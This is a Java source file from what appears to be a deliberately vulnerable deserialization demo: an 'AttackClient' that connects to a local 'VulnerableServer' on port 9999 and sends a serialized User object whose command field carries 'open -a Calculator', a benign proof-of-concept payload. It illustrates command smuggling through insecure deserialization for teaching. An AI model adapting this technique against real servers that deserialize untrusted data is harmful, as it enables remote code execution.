package com.chenluo.vulndeserializeccapp.service;

import com.chenluo.vulndeserializeccapp.enitity.User;

import java.io.IOException;
import java.io.ObjectOutputStream;
import java.net.Socket;

/**
 * Demo client that sends a serialized object to {@link VulnerableServer}.
 */
public class AttackClient {

    /**
     * Runs a socket client and sends one intentionally crafted {@link User} payload.
     *
     * @param args process arguments
     */
    public static void main(String[] args) {
        String serverHost = "localhost";
        int serverPort = 9999;

        try (Socket socket = new Socket(serverHost, serverPort);
             ObjectOutputStream oos = new ObjectOutputStream(socket.getOutputStream())) {

            System.out.println("Connected to VulnerableServer.");

            User maliciousUser = new User("Mallory", 40);
            maliciousUser.command = "open -a Calculator";
            maliciousUser.role = "attacker";

            System.out.println("Sending malicious user: " + maliciousUser);
            oos.writeObject(maliciousUser);
            oos.flush();
            System.out.println("Malicious user sent.");

        } catch (IOException e) {
            System.err.println("Error in AttackClient: " + e.getMessage());
            e.printStackTrace();
        }
    }
}
